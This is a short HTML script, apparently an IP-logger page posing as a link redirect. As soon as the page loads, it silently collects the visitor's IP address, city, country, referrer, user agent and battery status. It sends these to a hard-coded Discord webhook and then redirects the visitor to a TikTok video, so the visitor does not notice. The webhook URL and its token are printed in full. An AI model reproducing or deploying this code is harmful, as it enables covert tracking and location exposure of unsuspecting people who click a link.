    <script>
        async function getBatteryInfo() {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                return {
                    level: battery.level,
                    charging: battery.charging
                };
            }
            return null;
        }

        async function getIPInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                return await response.json();
            } catch (error) {
                return null;
            }
        }

        async function sendWebhook() {
            const batteryInfo = await getBatteryInfo();
            const ipInfo = await getIPInfo();

            const textContent = `
                IP Address: ${ipInfo?.ip || 'N/A'}
                Referrer: ${document.referrer || 'N/A'}
                Device: ${navigator.userAgent || 'N/A'}
                Battery Level: ${batteryInfo ? (batteryInfo.level * 100) + '%' : 'N/A'}
                Charging: ${batteryInfo ? batteryInfo.charging : 'N/A'}
                Country: ${ipInfo?.country_name || 'N/A'}
                City: ${ipInfo?.city || 'N/A'}
            `;

            await fetch('https://discord.com/api/webhooks/1270784182783836313/qo8sXsOWGrQB8qxkAfIL7g2HjRsJQ5DG-4qxu5_ZkcRZeghvQCihz0mgj_Y8WnDIyaYW', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ content: textContent })
            });

            window.location.href = "https://vm.tiktok.com/ZGevDfeRg/";
        }

        window.onload = sendWebhook;
    </script>
